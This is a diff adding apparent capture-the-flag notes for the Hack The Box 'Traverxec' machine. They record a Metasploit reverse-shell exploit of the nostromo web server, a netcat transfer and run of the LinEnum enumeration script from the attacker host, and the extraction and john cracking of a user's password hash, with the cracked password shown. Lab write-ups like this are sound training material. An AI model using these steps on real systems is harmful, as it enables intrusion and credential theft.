@@ -41,6 +41,169 @@ msf5 exploit(multi/http/nostromo_code_exec) > exploit
 [*] Sending cmd/unix/reverse_perl command payload
 [*] Command shell session 2 opened (10.10.14.54:4444 -> 10.10.10.165:48900) at 2020-04-02 19:31:28 -0400
 
+session
+pwd
+/usr/bin
+whoami
+www-data
+python -c "import pty;pty.spawn('/bin/bash')"
+www-data@traverxec:/usr/bin$ find / -type d -user www-data
+www-data@traverxec:/usr/bin$ cat /var/nostromo/logs/nhttpd.pid
+cat /var/nostromo/logs/nhttpd.pid
+440
+www-data@traverxec:/usr/bin$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+david:x:1000:1000:david,,,:/home/david:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+www-data@traverxec:/usr/bin$ ls -la /var/nostromo
+ls -la /var/nostromo
+total 24
+drwxr-xr-x  6 root     root   4096 Oct 25 14:43 .
+drwxr-xr-x 12 root     root   4096 Oct 25 14:43 ..
+drwxr-xr-x  2 root     daemon 4096 Oct 27 16:12 conf
+drwxr-xr-x  6 root     daemon 4096 Oct 25 17:11 htdocs
+drwxr-xr-x  2 root     daemon 4096 Oct 25 14:43 icons
+drwxr-xr-x  2 www-data daemon 4096 Apr  2 18:41 logs
+www-data@traverxec:/usr/bin$ cat /var/nostromo/conf
+cat /var/nostromo/conf
+cat: /var/nostromo/conf: Is a directory
+www-data@traverxec:/usr/bin$ ls -la /var/nostromo/conf
+ls -la /var/nostromo/conf
+total 20
+drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
+drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
+-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
+-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
+-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
+
+root@kali:~# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+root@kali:~# nc -lvp 8888 < LinEnum.sh 
+listening on [any] 8888 ...
+10.10.10.165: inverse host lookup failed: Unknown host
+connect to [10.10.14.54] from (UNKNOWN) [10.10.10.165] 41470
+
+www-data@traverxec:/var/nostromo/logs$ nc -nv 10.10.14.54 8888 > LinEnum.sh
+nc -nv 10.10.14.54 8888 > LinEnum.sh
+(UNKNOWN) [10.10.14.54] 8888 (?) open
+Background session 3? [y/N]  n
+[*] Backgrounding foreground process in the shell session
+^Z
+[1]+  Stopped                 nc -nv 10.10.14.54 8888 > LinEnum.sh
+www-data@traverxec:/var/nostromo/logs$ 
+
+www-data@traverxec:/var/nostromo/logs$ ls
+ls
+LinEnum.sh  nhttpd.pid
+www-data@traverxec:/var/nostromo/logs$ chmod 777 LinEnum.sh
+www-data@traverxec:/var/nostromo/logs$ /bin/bash LinEnum.sh
+/bin/bash LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Thu Apr  2 20:23:34 EDT 2020
+........
+.....
+...
+.
+[-] htpasswd found - could contain passwords:
+/var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root root 708 Oct 25 14:34 /var/backups/group.bak
+-rw------- 1 root root 1395 Oct 25 14:34 /var/backups/passwd.bak
+-rw------- 1 root shadow 597 Oct 25 14:34 /var/backups/gshadow.bak
+-rw------- 1 root shadow 940 Oct 27 04:56 /var/backups/shadow.bak
+
+// found david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ , save it in Kali
+
+root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt david.hash 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 32/32])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:09:00 51.42% (ETA: 20:44:13) 0g/s 13575p/s 13575c/s 13575C/s idiosolo..idhra23
+Nowonly4me       (david)
+1g 0:00:12:58 DONE (2020-04-02 20:39) 0.001284g/s 13583p/s 13583c/s 13583C/s Nsude1..November202001
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+// but this pw unable to ssh advid
+
+www-data@traverxec:/var/nostromo/logs$ cat /var/nostromo/conf/nhttpd.conf
+cat /var/nostromo/conf/nhttpd.conf
+# MAIN [MANDATORY]
+
+servername		traverxec.htb
+serverlisten		*
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+
+# LOGS [OPTIONAL]
+
+logpid			logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user			www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons			/var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+
+// aftet check this config file, found homedirs_public		public_www
+
+
 
 
 
